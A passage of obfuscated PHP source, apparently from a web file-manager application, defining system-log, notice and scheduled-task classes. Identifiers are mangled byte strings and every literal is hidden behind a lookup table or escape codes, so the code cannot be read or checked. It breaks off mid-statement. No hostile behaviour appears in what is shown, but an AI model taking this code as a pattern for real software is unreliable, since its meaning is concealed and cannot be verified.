$æŸÊàù® =& $_SERVER[ñ÷§¡å]; $¿•Ÿ¯¦ = $this->findByName($ÑÅ´ÎıÏ); $ù¦ÕÔÜİ = $this->findByName($›ãƒ şÅ[$æŸÊàù®[32]]); if (!$¿•Ÿ¯¦ || $ù¦ÕÔÜİ && $ù¦ÕÔÜİ[$æŸÊàù®[408]] != $¿•Ÿ¯¦[$æŸÊàù®[408]]) { return !1; } return parent::update($¿•Ÿ¯¦[$æŸÊàù®[408]], $›ãƒ şÅ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\137\154\157\x67"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\124\151\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\x72\164", "\146\165\x6e\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¾‡úó¥© =& $_SERVER[ñ÷§¡å]; return array($¾‡úó¥©[2163] => LNG($¾‡úó¥©[2164]), $¾‡úó¥©[2165] => LNG($¾‡úó¥©[2166]), $¾‡úó¥©[1778] => LNG($¾‡úó¥©[2167]), $¾‡úó¥©[2168] => LNG($¾‡úó¥©[2169]), $¾‡úó¥©[2170] => LNG($¾‡úó¥©[2171]), $¾‡úó¥©[2172] => LNG($¾‡úó¥©[2173]), $¾‡úó¥©[2174] => LNG($¾‡úó¥©[2175]), $¾‡úó¥©[1808] => LNG($¾‡úó¥©[2175]), $¾‡úó¥©[1809] => LNG($¾‡úó¥©[2176]), $¾‡úó¥©[2177] => LNG($¾‡úó¥©[2178]), $¾‡úó¥©[2179] => LNG($¾‡úó¥©[2180]), $¾‡úó¥©[2181] => LNG($¾‡úó¥©[2182]), $¾‡úó¥©[2183] => LNG($¾‡úó¥©[2184]), $¾‡úó¥©[1806] => LNG($¾‡úó¥©[2185]), $¾‡úó¥©[2186] => LNG($¾‡úó¥©[2187]), $¾‡úó¥©[1813] => LNG($¾‡úó¥©[2188]), $¾‡úó¥©[2189] => LNG($¾‡úó¥©[2190]), $¾‡úó¥©[2191] => LNG($¾‡úó¥©[2192]), $¾‡úó¥©[2193] => LNG($¾‡úó¥©[2194]), $¾‡úó¥©[2195] => LNG($¾‡úó¥©[2196]), $¾‡úó¥©[1816] => LNG($¾‡úó¥©[2197]), $¾‡úó¥©[1817] => LNG($¾‡úó¥©[2198]), $¾‡úó¥©[2199] => LNG($¾‡úó¥©[2200]), $¾‡úó¥©[2201] => LNG($¾‡úó¥©[2202]), $¾‡úó¥©[2203] => LNG($¾‡úó¥©[2204]), $¾‡úó¥©[1811] => LNG($¾‡úó¥©[2205]), $¾‡úó¥©[2206] => LNG($¾‡úó¥©[2207]), $¾‡úó¥©[1810] => LNG($¾‡úó¥©[2208]), $¾‡úó¥©[2209] => LNG($¾‡úó¥©[2210]), $¾‡úó¥©[2211] => LNG($¾‡úó¥©[2212]), $¾‡úó¥©[2213] => LNG($¾‡úó¥©[2214]), $¾‡úó¥©[2215] => LNG($¾‡úó¥©[2215]), $¾‡úó¥©[2216] => LNG($¾‡úó¥©[1782]), $¾‡úó¥©[2217] => LNG($¾‡úó¥©[2218]), $¾‡úó¥©[2219] => LNG($¾‡úó¥©[2220]), $¾‡úó¥©[2221] => LNG($¾‡úó¥©[2222]), $¾‡úó¥©[2223] => LNG($¾‡úó¥©[2224]), $¾‡úó¥©[2225] => LNG($¾‡úó¥©[2226]), $¾‡úó¥©[2227] => LNG($¾‡úó¥©[2227]), $¾‡úó¥©[2228] => LNG($¾‡úó¥©[2229]), $¾‡úó¥©[2230] => LNG($¾‡úó¥©[2231]), $¾‡úó¥©[2232] => LNG($¾‡úó¥©[2233]), $¾‡úó¥©[2234] => LNG($¾‡úó¥©[2235]), $¾‡úó¥©[2236] => LNG($¾‡úó¥©[2237]), $¾‡úó¥©[2238] => LNG($¾‡úó¥©[2239])); } private function typeFile() { $©¸ûÁ™¿ =& $_SERVER[ñ÷§¡å]; $óÏğòÔÈ = array($©¸ûÁ™¿[1813] => array($©¸ûÁ™¿[1814]), $©¸ûÁ™¿[2181] => array($©¸ûÁ™¿[2240]), $©¸ûÁ™¿[2183] => array($©¸ûÁ™¿[2241]), $©¸ûÁ™¿[1806] => array($©¸ûÁ™¿[1807]), $©¸ûÁ™¿[2191] => array(), $©¸ûÁ™¿[2193] => array(), $©¸ûÁ™¿[2195] => array(), $©¸ûÁ™¿[1816] => array($©¸ûÁ™¿[1818]), $©¸ûÁ™¿[1817] => array($©¸ûÁ™¿[1818]), $©¸ûÁ™¿[2199] => array($©¸ûÁ™¿[2242]), $©¸ûÁ™¿[2201] => array($©¸ûÁ™¿[2242]), $©¸ûÁ™¿[2203] => array($©¸ûÁ™¿[2243]), $©¸ûÁ™¿[2189] => array($©¸ûÁ™¿[2244]), $©¸ûÁ™¿[1811] => array($©¸ûÁ™¿[2245]), $©¸ûÁ™¿[2206] => array($©¸ûÁ™¿[2246]), $©¸ûÁ™¿[1810] => array($©¸ûÁ™¿[1812])); return $óÏğòÔÈ; } private function typeAll() { $¸Ó‰å’ù =& $_SERVER[ñ÷§¡å]; $ÚÌÆ•äú = $this->typeList; $ˆ‡èºƒÈ = array_filter($this->typeFile()); foreach ($ˆ‡èºƒÈ as $–­ÑŠØá => $°é·ªÃ) { $ÚÌÆ•äú[$°é·ªÃ[0]] = $ÚÌÆ•äú[$–­ÑŠØá]; } $ÚÌÆ•äú[$¸Ó‰å’ù[1818]] = LNG($¸Ó‰å’ù[2247]); $ÚÌÆ•äú[$¸Ó‰å’ù[2242]] = LNG($¸Ó‰å’ù[2248]); return $ÚÌÆ•äú; } public function addLog($©Á¯˜£, $¸’—Ä™“ = array()) { $é½Ø»Ó¡ =& $_SERVER[ñ÷§¡å]; if (!isset($this->typeList[$©Á¯˜£])) { return; } $Üã‚•£Í = defined($é½Ø»Ó¡[484]) && USER_ID ? USER_ID : (isset($¸’—Ä™“[$é½Ø»Ó¡[1663]]) ? $¸’—Ä™“[$é½Ø»Ó¡[1663]] : 0); if (!$Üã‚•£Í) { $Üã‚•£Í = (int) Session::get($é½Ø»Ó¡[1972]); } if ($©Á¯˜£ == $é½Ø»Ó¡[2217] && is_array($¸’—Ä™“[$é½Ø»Ó¡[2249]]) && !$¸’—Ä™“[$é½Ø»Ó¡[2249]]) { return; } $’ø†ù®© = get_client_ip(); if (!$¸’—Ä™“ || strlen(json_encode($¸’—Ä™“)) >= 1024) { $¸’—Ä™“ = array($é½Ø»Ó¡[2250] => $’ø†ù®©); } else { if (is_array($¸’—Ä™“)) { $¸’—Ä™“[$é½Ø»Ó¡[2250]] = $’ø†ù®©; } else { $¸’—Ä™“ = array($é½Ø»Ó¡[1200] => $¸’—Ä™“, $é½Ø»Ó¡[2250] => $’ø†ù®©); } } $¸’—Ä™“ = array($é½Ø»Ó¡[1653] => Session::sign(), $é½Ø»Ó¡[1654] => $Üã‚•£Í, $é½Ø»Ó¡[33] => $©Á¯˜£, $é½Ø»Ó¡[1656] => json_encode($¸’—Ä™“)); parent::add($¸’—Ä™“); } public function remove($áå‡¦ƒ¬) { $this->where(array($_SERVER[ñ÷§¡å][428] => $áå‡¦ƒ¬))->delete(); } private function _makeOrder($‘„°‚¿Î = '') { $õ»ÆÓ =& $_SERVER[ñ÷§¡å]; $ë±€•ô = $õ»ÆÓ[210]; $€½Ğ•èÍ = array($õ»ÆÓ[459] => $õ»ÆÓ[460], $õ»ÆÓ[461] => $õ»ÆÓ[462]); $µÚÕøÖÄ = Input::get($õ»ÆÓ[467], $õ»ÆÓ[7], $õ»ÆÓ[2004], array($õ»ÆÓ[1926], $õ»ÆÓ[461])); $µÚÕøÖÄ = $€½Ğ•èÍ[$µÚÕøÖÄ]; $‘„°‚¿Î = $‘„°‚¿Î . "{$ë±€•ô}\x20{$µÚÕøÖÄ}"; return $this->order($‘„°‚¿Î); } public function get($üÃ‹«Šª = '') { $±’Å“àß =& $_SERVER[ñ÷§¡å]; if (!$üÃ‹«Šª) { show_json(array()); } $¾³¦†²ê = array(); if ($üÃ‹«Šª[$±’Å“àß[1663]]) { $¾³¦†²ê[$±’Å“àß[1663]] = $üÃ‹«Šª[$±’Å“àß[1663]]; } if (isset($üÃ‹«Šª[$±’Å“àß[774]])) { $şá¿ì¢Ø = $üÃ‹«Šª[$±’Å“àß[774]]; $¤Ó—áóı = isset($üÃ‹«Šª[$±’Å“àß[506]]) ? $üÃ‹«Šª[$±’Å“àß[506]] : time(); $¾³¦†²ê[$±’Å“àß[210]] = array($±’Å“àß[342], array($şá¿ì¢Ø, $¤Ó—áóı)); } if ($üÃ‹«Šª[$±’Å“àß[33]]) { $À·ÏÈ¸ó = explode($±’Å“àß[50], $üÃ‹«Šª[$±’Å“àß[33]]); $­©¶‹ò’ = $this->typeFile(); $¿”ÏÉ€Î = array(); foreach ($À·ÏÈ¸ó as $¥¦…Ã¾â) { $¿”ÏÉ€Î[] = $¥¦…Ã¾â; if (isset($­©¶‹ò’[$¥¦…Ã¾â])) { $¿”ÏÉ€Î = array_merge($¿”ÏÉ€Î, $­©¶‹ò’[$¥¦…Ã¾â]); } } $¿”ÏÉ€Î = array_unique($¿”ÏÉ€Î); if ($¿”ÏÉ€Î) { $¾³¦†²ê[$±’Å“àß[33]] = array($±’Å“àß[7], $¿”ÏÉ€Î); } } else { $¾³¦†²ê[$±’Å“àß[33]] = array($±’Å“àß[2251], $±’Å“àß[2252]); } if (!empty($üÃ‹«Šª[$±’Å“àß[2250]])) { $¾³¦†²ê[$±’Å“àß[462]] = array($±’Å“àß[392], "\45{$üÃ‹«Šª[$±’Å“àß[2250]]}\45"); } $ÚŠ¨ˆÌ¸ = $this->_makeOrder()->where($¾³¦†²ê)->selectPage(); if (empty($ÚŠ¨ˆÌ¸[$±’Å“àß[378]])) { show_json(array(), !0, $ÚŠ¨ˆÌ¸[$±’Å“àß[375]]); } $ÚŠ¨ˆÌ¸[$±’Å“àß[378]] = $this->logList($ÚŠ¨ˆÌ¸[$±’Å“àß[378]]); return $ÚŠ¨ˆÌ¸; } private function ipAddress(&$õ§ßï§ƒ) { $óàµòà¥ =& $_SERVER[ñ÷§¡å]; if (!empty($õ§ßï§ƒ[$óàµòà¥[2250]])) { $“ËØêÈ = IpLocation::get($õ§ßï§ƒ[$óàµòà¥[2250]]); } else { $“ËØêÈ = LNG($óàµòà¥[2253]); } $õ§ßï§ƒ[$óàµòà¥[2254]] = $“ËØêÈ; } private function descZipDownload($…’ÈÆî, &$ò–ú‘¾„) { $†òÌé‡ =& $_SERVER[ñ÷§¡å]; if (!isset($…’ÈÆî[$†òÌé‡[2255]])) { return; } $Â®¥³ğ³ = json_decode($…’ÈÆî[$†òÌé‡[2255]], !0); foreach ($Â®¥³ğ³ as $Çª¬‘«¡) { try { $ÒõŞ‹‚ = IO::infoFull($Çª¬‘«¡[$†òÌé‡[94]]); } catch (Exception $ò¢Í¥•¨) { continue; } $…’ÈÆî[$†òÌé‡[94]] = $Çª¬‘«¡[$†òÌé‡[94]]; $ò–ú‘¾„[] = $…’ÈÆî[$†òÌé‡[411]] = $ÒõŞ‹‚[$†òÌé‡[411]]; $ò–ú‘¾„[] = $…’ÈÆî[$†òÌé‡[2058]] = $ÒõŞ‹‚[$†òÌé‡[441]]; break; } return $…’ÈÆî; } private function getSourceList(&$¸ƒÂ£Úô) { $ö„ıÄ­‰ =& $_SERVER[ñ÷§¡å]; $„ëóÓ» = array(); foreach ($¸ƒÂ£Úô as $‹÷üÅ÷² => $×ãàÊùÙ) { $ğÓ¥£Ö£ = json_decode($×ãàÊùÙ[$ö„ıÄ­‰[462]], !0); if ($×ãàÊùÙ[$ö„ıÄ­‰[33]] == $ö„ıÄ­‰[1809]) { $ğÓ¥£Ö£ = $this->descZipDownload($ğÓ¥£Ö£, $„ëóÓ»); $¸ƒÂ£Úô[$‹÷üÅ÷²][$ö„ıÄ­‰[462]] = json_encode($ğÓ¥£Ö£); continue; } if (strpos($×ãàÊùÙ[$ö„ıÄ­‰[33]], $ö„ıÄ­‰[2060]) !== 0) { if (!isset($ğÓ¥£Ö£[$ö„ıÄ­‰[94]]) || strpos($×ãàÊùÙ[$ö„ıÄ­‰[33]], $ö„ıÄ­‰[2256]) !== 0) { continue; } try { $ìš¦´ïŠ = IO::infoFull($ğÓ¥£Ö£[$ö„ıÄ­‰[94]]); } catch (Exception $£Ş¡ĞËˆ) { continue; } $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[411]] = $ìš¦´ïŠ[$ö„ıÄ­‰[411]]; $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[2058]] = $ìš¦´ïŠ[$ö„ıÄ­‰[441]]; $¸ƒÂ£Úô[$‹÷üÅ÷²][$ö„ıÄ­‰[462]] = json_encode($ğÓ¥£Ö£); continue; } $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[411]]; $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[2058]]; if ($ğÓ¥£Ö£[$ö„ıÄ­‰[33]] == $ö„ıÄ­‰[566]) { $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[462]][$ö„ıÄ­‰[1167]]; $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[462]][$ö„ıÄ­‰[1168]]; } if ($ğÓ¥£Ö£[$ö„ıÄ­‰[33]] == $ö„ıÄ­‰[2068]) { $„ëóÓ»[] = $ğÓ¥£Ö£[$ö„ıÄ­‰[462]][$ö„ıÄ­‰[411]]; } } if (!$„ëóÓ») { return array(); } return Model($ö„ıÄ­‰[838])->sourceListInfo($„ëóÓ», !0); } private function logList($Ú¯•ú£ï) { $ÇÚäÒ =& $_SERVER[ñ÷§¡å]; $ê›Á¥úÌ = array_to_keyvalue($Ú¯•ú£ï, $ÇÚäÒ[12], $ÇÚäÒ[1663]); $ö¬¸…¢È = Model($ÇÚäÒ[544])->userListInfo(array_unique($ê›Á¥úÌ)); $Ü«ŒßÍÌ = $this->getSourceList($Ú¯•ú£ï); $åìıõÚİ = $this->typeAll(); $Û €ùî = array(); $¯úÁÎ¨ = array(); foreach ($Ú¯•ú£ï as $ü¿¶µ›Ú => $±Çü¿Êç) { $ûÓœ”ú = $±Çü¿Êç[$ÇÚäÒ[33]]; $¨™Ùş° = isset($ö¬¸…¢È[$±Çü¿Êç[$ÇÚäÒ[1663]]]) ? $ö¬¸…¢È[$±Çü¿Êç[$ÇÚäÒ[1663]]] : !1; $‹¥ÔÆºÄ = strpos($ûÓœ”ú, $ÇÚäÒ[2257]) === 0 ? LNG($ÇÚäÒ[2258]) : LNG($ÇÚäÒ[2253]); $±Çü¿Êç[$ÇÚäÒ[32]] = isset($¨™Ùş°[$ÇÚäÒ[32]]) ? $¨™Ùş°[$ÇÚäÒ[32]] : LNG($ÇÚäÒ[2253]); $±Çü¿Êç[$ÇÚäÒ[551]] = isset($¨™Ùş°[$ÇÚäÒ[551]]) ? $¨™Ùş°[$ÇÚäÒ[551]] : $ÇÚäÒ[12]; $±Çü¿Êç[$ÇÚäÒ[1562]] = isset($åìıõÚİ[$ûÓœ”ú]) ? $åìıõÚİ[$ûÓœ”ú] : $‹¥ÔÆºÄ; $±Çü¿Êç[$ÇÚäÒ[2003]] = $¨™Ùş°; $Ù”Ø“Û = json_decode($±Çü¿Êç[$ÇÚäÒ[462]], !0); $±Çü¿Êç[$ÇÚäÒ[2250]] = isset($Ù”Ø“Û[$ÇÚäÒ[2250]]) ? $Ù”Ø“Û[$ÇÚäÒ[2250]] : $ÇÚäÒ[12]; $±Çü¿Êç[$ÇÚäÒ[2254]] = IpLocation::get($±Çü¿Êç[$ÇÚäÒ[2250]]); if (strpos($ûÓœ”ú, $ÇÚäÒ[2060]) === 0 || isset($Ù”Ø“Û[$ÇÚäÒ[2058]])) { $Ù”Ø“Û[$ÇÚäÒ[96]] = $Ü«ŒßÍÌ[$Ù”Ø“Û[$ÇÚäÒ[411]]]; $Ù”Ø“Û[$ÇÚäÒ[2073]] = $Ü«ŒßÍÌ[$Ù”Ø“Û[$ÇÚäÒ[2058]]]; if ($Ù”Ø“Û[$ÇÚäÒ[33]] == $ÇÚäÒ[566]) { $Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[1167]] = $Ü«ŒßÍÌ[$Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[1167]]]; $Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[1168]] = $Ü«ŒßÍÌ[$Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[1168]]]; } if ($Ù”Ø“Û[$ÇÚäÒ[33]] == $ÇÚäÒ[2068]) { $Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[411]] = $Ü«ŒßÍÌ[$Ù”Ø“Û[$ÇÚäÒ[462]][$ÇÚäÒ[411]]]; } if ($Ù”Ø“Û[$ÇÚäÒ[33]] == $ÇÚäÒ[1804]) { $Ù”Ø“Û[$ÇÚäÒ[2073]] = $Ù”Ø“Û[$ÇÚäÒ[96]]; $Ù”Ø“Û[$ÇÚäÒ[2058]] = $Ù”Ø“Û[$ÇÚäÒ[2073]][$ÇÚäÒ[411]]; $Ù”Ø“Û[$ÇÚäÒ[96]] = !1; $Ù”Ø“Û[$ÇÚäÒ[411]] = $ÇÚäÒ[12]; } if ($Ù”Ø“Û[$ÇÚäÒ[96]] && $Ù”Ø“Û[$ÇÚäÒ[96]][$ÇÚäÒ[420]] == $ÇÚäÒ[1283]) { $¯úÁÎ¨[] = $±Çü¿Êç[$ÇÚäÒ[408]]; unset($Ú¯•ú£ï[$ü¿¶µ›Ú]); continue; } if ($Ù”Ø“Û[$ÇÚäÒ[2073]] && $Ù”Ø“Û[$ÇÚäÒ[2073]][$ÇÚäÒ[420]] == $ÇÚäÒ[1283]) { $¯úÁÎ¨[] = $±Çü¿Êç[$ÇÚäÒ[408]]; unset($Ú¯•ú£ï[$ü¿¶µ›Ú]); continue; } } $±Çü¿Êç[$ÇÚäÒ[462]] = $Ù”Ø“Û; unset($±Çü¿Êç[$ÇÚäÒ[2259]]); $Û €ùî[] = $±Çü¿Êç; } $this->clearSystemPathLog($¯úÁÎ¨); return $Û €ùî; } private function clearSystemPathLog($î¡ÜºŠ) { $‰ÜßëÉ =& $_SERVER[ñ÷§¡å]; if (count($î¡ÜºŠ) == 0) { return; } $Ù÷œ‚— = array($‰ÜßëÉ[408] => array($‰ÜßëÉ[7], array_unique($î¡ÜºŠ))); $this->where($Ù÷œ‚—)->delete(); } public function deviceList($¢»·•…, $›¦İØÏ = 0) { $•Â¦ò¨ =& $_SERVER[ñ÷§¡å]; $êŞı¬¯ = array($•Â¦ò¨[1663] => $¢»·•…, $•Â¦ò¨[210] => array($•Â¦ò¨[1021], $›¦İØÏ), $•Â¦ò¨[33] => $•Â¦ò¨[1778]); $ÃôÚª‹è = array(); $³ÖµÅ¢™ = $this->field($•Â¦ò¨[2260])->where($êŞı¬¯)->order($•Â¦ò¨[2071])->limit(50)->select(); foreach ($³ÖµÅ¢™ as $ÀÛÔ½Üâ => $ÏÇ†¥Ö„) { if ($ÀÛÔ½Üâ > 0 && abs($ÏÇ†¥Ö„[$•Â¦ò¨[210]] - $³ÖµÅ¢™[$ÀÛÔ½Üâ - 1][$•Â¦ò¨[210]]) < 5) { continue; } $©ÑøõıÀ = json_decode($ÏÇ†¥Ö„[$•Â¦ò¨[462]], !0); $ÏÇ†¥Ö„[$•Â¦ò¨[2250]] = isset($©ÑøõıÀ[$•Â¦ò¨[2250]]) ? $©ÑøõıÀ[$•Â¦ò¨[2250]] : $•Â¦ò¨[12]; unset($©ÑøõıÀ[$•Â¦ò¨[2250]]); $¼«øïâß = $this->deviceType($©ÑøõıÀ[$•Â¦ò¨[2061]]); if (isset($ÃôÚª‹è[$¼«øïâß])) { continue; } $ÏÇ†¥Ö„[$•Â¦ò¨[2254]] = IpLocation::get($ÏÇ†¥Ö„[$•Â¦ò¨[2250]]); $ÏÇ†¥Ö„[$•Â¦ò¨[462]] = $©ÑøõıÀ; $ÃôÚª‹è[$¼«øïâß] = $ÏÇ†¥Ö„; } return array_values($ÃôÚª‹è); } public function deviceType($ŞÓÅí…) { return $ŞÓÅí…; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x6e\x6f\x74\151\x63\145\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\x63\157\x6e\x74\x65\x6e\x74", "\141\165\164\150", "\x6d\x6f\x64\x65", "\164\151\155\x65", "\164\x79\x70\x65", "\154\145\x76\x65\x6c", "\145\156\141\x62\x6c\145", "\163\x6f\x72\x74"); public function listData($´İĞ—âš = false, $ùùÌÒ‡ = "\x73\157\x72\164", $Ó¼Š’¥Ü = false) { return parent::listData($´İĞ—âš, $ùùÌÒ‡, $Ó¼Š’¥Ü); } public function add($œ•Óƒè) { $§ÁÌ“¤ =& $_SERVER[ñ÷§¡å]; $øÒŠàü = time(); if ($œ•Óƒè[$§ÁÌ“¤[16]] == $§ÁÌ“¤[2261]) { $øÒŠàü = strtotime($œ•Óƒè[$§ÁÌ“¤[213]]); } $œ•Óƒè[$§ÁÌ“¤[213]] = $øÒŠàü; return parent::insert($œ•Óƒè); } public function update($°ğ¶â©¼, $Š…Ü¨õÀ) { $İíÙ¾’ =& $_SERVER[ñ÷§¡å]; $¨ÖĞäÊ = $this->listData($°ğ¶â©¼); if (!$¨ÖĞäÊ) { return !1; } $Åì¯ßÈê = time(); if ($Š…Ü¨õÀ[$İíÙ¾’[16]] == $İíÙ¾’[2261]) { $Åì¯ßÈê = strtotime($Š…Ü¨õÀ[$İíÙ¾’[213]]); } $Š…Ü¨õÀ[$İíÙ¾’[213]] = $Åì¯ßÈê; return parent::update($°ğ¶â©¼, $Š…Ü¨õÀ); } public function remove($Úá†·ä») { $¼ñ«½ïã = $this->listData($Úá†·ä»); if (!$¼ñ«½ïã || $¼ñ«½ïã[$_SERVER[ñ÷§¡å][1283]]) { return !1; } return parent::remove($Úá†·ä»); } public function sort($ŞÌ­Îİ, $¦¢ç¢è¸) { return parent::update($ŞÌ­Îİ, $¦¢ç¢è¸); } public function enable($“¼ùó•¿, $‡Êò¯ã´) { return parent::update($“¼ùó•¿, array($_SERVER[ñ÷§¡å][2262] => $‡Êò¯ã´)); } private function initUserOption() { $ªÍÑûÜ¦ =& $_SERVER[ñ÷§¡å]; $this->optionType = $ªÍÑûÜ¦[2263]; $this->modelType = $ªÍÑûÜ¦[2264]; $this->field = array($ªÍÑûÜ¦[2265], $ªÍÑûÜ¦[32], $ªÍÑûÜ¦[213], $ªÍÑûÜ¦[33], $ªÍÑûÜ¦[2266], $ªÍÑûÜ¦[763], $ªÍÑûÜ¦[205]); } public function userNoticeGet($ÚÂÅÏÄ“ = false) { $this->initUserOption(); return parent::listData($ÚÂÅÏÄ“, $_SERVER[ñ÷§¡å][408], !0); } public function userNoticeAdd($ÃŠá‘Ãà) { $ ù¯·úÛ =& $_SERVER[ñ÷§¡å]; $this->initUserOption(); $«®ñ½ãå = $this->findByKey($ ù¯·úÛ[2265], $ÃŠá‘Ãà[$ ù¯·úÛ[408]]); if ($«®ñ½ãå) { return !0; } $Ûçê’¼Ó = array($ ù¯·úÛ[2265] => $ÃŠá‘Ãà[$ ù¯·úÛ[408]], $ ù¯·úÛ[32] => $ÃŠá‘Ãà[$ ù¯·úÛ[32]], $ ù¯·úÛ[213] => $ÃŠá‘Ãà[$ ù¯·úÛ[213]], $ ù¯·úÛ[33] => isset($ÃŠá‘Ãà[$ ù¯·úÛ[33]]) ? $ÃŠá‘Ãà[$ ù¯·úÛ[33]] : 1, $ ù¯·úÛ[2266] => isset($ÃŠá‘Ãà[$ ù¯·úÛ[2266]]) ? $ÃŠá‘Ãà[$ ù¯·úÛ[2266]] : 0, $ ù¯·úÛ[763] => 0, $ ù¯·úÛ[205] => 0); return parent::insert($Ûçê’¼Ó); } public function userNoticeEdit($Úé–¨ô, $Äà²šÔş) { $this->initUserOption(); return parent::update($Úé–¨ô, $Äà²šÔş); } } goto Bê˜¶àÀ«; dˆ„„³Ë¨Û: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $”±Ä±ÀÚ =& $_SERVER[ñ÷§¡å]; if (self::valueGet($”±Ä±ÀÚ[763]) != $”±Ä±ÀÚ[98]) { return; } if (self::valueGet($”±Ä±ÀÚ[1622]) == $”±Ä±ÀÚ[98]) { $ÏœûØ€‹ = self::valueGet($”±Ä±ÀÚ[1623]); if (time() - $ÏœûØ€‹ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$”±Ä±ÀÚ[1624]] = 1; self::valueSet($”±Ä±ÀÚ[1622], $”±Ä±ÀÚ[98]); self::log($”±Ä±ÀÚ[1625] . ACTION . $”±Ä±ÀÚ[1626]); Session::$data = array(); Session::$sessionSign = $”±Ä±ÀÚ[12]; $GLOBALS[$”±Ä±ÀÚ[512]] = 1; Hook::bind($”±Ä±ÀÚ[1627], $”±Ä±ÀÚ[1628]); $…ñ¸ÀĞ­ = 0; while (!0) { self::cacheClear(); if (self::valueGet($”±Ä±ÀÚ[763]) != $”±Ä±ÀÚ[98]) { self::valueSet($”±Ä±ÀÚ[1622], $”±Ä±ÀÚ[207]); self::log($”±Ä±ÀÚ[1629]); die; } $±å ÀµÂ = time(); if ($±å ÀµÂ - $…ñ¸ÀĞ­ >= 60) { self::valueSet(array($”±Ä±ÀÚ[1622] => $”±Ä±ÀÚ[98], $”±Ä±ÀÚ[1623] => $±å ÀµÂ), !1); $…ñ¸ÀĞ­ = $±å ÀµÂ; } if (!file_exists(USER_SYSTEM . $”±Ä±ÀÚ[1630])) { self::valueSet(array($”±Ä±ÀÚ[1622] => $”±Ä±ÀÚ[207], $”±Ä±ÀÚ[763] => $”±Ä±ÀÚ[207]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $áŒĞç„ =& $_SERVER[ñ÷§¡å]; http_close(); self::valueSet($áŒĞç„[763], $áŒĞç„[207]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($áŒĞç„[1622] => $áŒĞç„[207], $áŒĞç„[763] => $áŒĞç„[98]), !1); } public static function taskSwitch() { $É´Ù÷ªš =& $_SERVER[ñ÷§¡å]; $Ô×²ó– = self::valueGet($É´Ù÷ªš[763]) == $É´Ù÷ªš[98] ? $É´Ù÷ªš[207] : $É´Ù÷ªš[98]; self::valueSet($É´Ù÷ªš[763], $Ô×²ó–); } public static function shutdownEvent() { $ââ’Ù Ã =& $_SERVER[ñ÷§¡å]; self::valueSet($ââ’Ù Ã[1622], $ââ’Ù Ã[207]); self::log($ââ’Ù Ã[1631]); } public static function config($¶ Âœšî, $ïÈõ‰Õì) { self::valueSet($_SERVER[ñ÷§¡å][763], $¶ Âœšî); } private static function taskRunAll() { $ŒÙ•à€Ã =& $_SERVER[ñ÷§¡å]; $şÛÂŠ×ı = timeFloat(); $‘ö¯›¿ = Model($ŒÙ•à€Ã[1632])->listData(); $€Äû”Ì‰ = count($‘ö¯›¿); for ($Òå»Üº¢ = 0; $Òå»Üº¢ < $€Äû”Ì‰; $Òå»Üº¢++) { $Õ‘±Ô³” = $‘ö¯›¿[$Òå»Üº¢]; if (!$Õ‘±Ô³”[$ŒÙ•à€Ã[408]] || $Õ‘±Ô³”[$ŒÙ•à€Ã[1633]] != $ŒÙ•à€Ã[98]) { continue; } if (!self::taskTimeCheck($Õ‘±Ô³”)) { continue; } self::taskRun($Õ‘±Ô³”); } Hook::trigger($ŒÙ•à€Ã[1634]); self::taskQueueRun($şÛÂŠ×ı); } private static function taskQueueRun($Õã¨²Øå) { $‹×ÆòÖ‡ = 10; while (!0) { $Å¢—š¤Í = TaskQueue::run(); if ($Å¢—š¤Í === !1) { break; } if (timeFloat() - $Õã¨²Øå >= $‹×ÆòÖ‡) { break; } } } private static function taskTimeCheck($¸Ë¢ø¨­) { $±Äí€… =& $_SERVER[ñ÷§¡å]; $Âß¸ÇËä = json_decode($¸Ë¢ø¨­[$±Äí€…[213]], !0); $—”ŸÙŞÂ = intval($¸Ë¢ø¨­[$±Äí€…[1623]]); $œËÀßÍ÷ = strtotime($±Äí€…[1635] . $Âß¸ÇËä[$±Äí€…[1636]] . $±Äí€…[1637]) - strtotime($±Äí€…[1638]); $½ÑÓäü = time() - strtotime(date($±Äí€…[1639]) . $±Äí€…[1640]); $µÚÒ¨Ê = $½ÑÓäü >= $œËÀßÍ÷ && $½ÑÓäü <= $œËÀßÍ÷ + 3600; switch ($Âß¸ÇËä[$±Äí€…[33]]) { case $±Äí€…[1641]: if (time() - $—”ŸÙŞÂ < 3600 * 24 * 30) { return !1; } if ($Âß¸ÇËä[$±Äí€…[1641]] == date($±Äí€…[1642]) && $µÚÒ¨Ê) { return !0; } break; case $±Äí€…[1643]: if (time() - $—”ŸÙŞÂ < 3600 * 24 * 7) { return !1; } $´Åõã«´ = date($±Äí€…[1644]) == 0 ? 7 : date($±Äí€…[1644]); if ($Âß¸ÇËä[$±Äí€…[1643]] == $´Åõã«´ && $µÚÒ¨Ê) { return !0; } break; case $±Äí€…[1636]: if (time() - $—”ŸÙŞÂ < 3600 * 24) { return !1; } if ($µÚÒ¨Ê) { return !0; } break; case $±Äí€…[1645]: if (time() - $—”ŸÙŞÂ >= floatval($Âß¸ÇËä[$±Äí€…[1645]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ŞÍ¢¹¨½ =& $_SERVER[ñ÷§¡å]; static $ƒ¹´àåï = 0; $¾€ÃÊÏ² = 300; if 